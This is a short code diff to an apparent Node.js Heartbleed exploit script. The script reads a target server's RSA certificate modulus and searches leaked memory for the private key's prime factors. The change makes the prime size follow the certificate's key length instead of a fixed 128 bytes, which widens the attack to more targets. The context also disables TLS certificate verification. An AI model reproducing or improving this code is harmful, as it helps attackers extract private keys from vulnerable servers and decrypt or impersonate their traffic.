@@ -21,6 +21,7 @@ process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
 // Will be lazily loaded
 var m;
 var e;
+var primeSize;
 var bar;
 var zero = new bignum('0');
 var gbCount = 0;
@@ -45,6 +46,7 @@ function heartbleed(ip, port, host) {
       var cert = s.getPeerCertificate();
       m = bignum(cert.modulus, 16);
       e = bignum(cert.exponent, 10);
+      primeSize = cert.modulus.length / 4;
     }
 
     setTimeout(function() {
@@ -100,7 +102,7 @@ function heartbleed(ip, port, host) {
 }
 
 function test(chunk) {
-  var size = 128;
+  var size = primeSize;
   for (var i = 0; i < chunk.length - size - 1; i += 8) {
     // Ignore even numbers, and ones that are not terminating with `0`
     if (chunk[i] % 2 === 0 || chunk[i + size] !== 0)
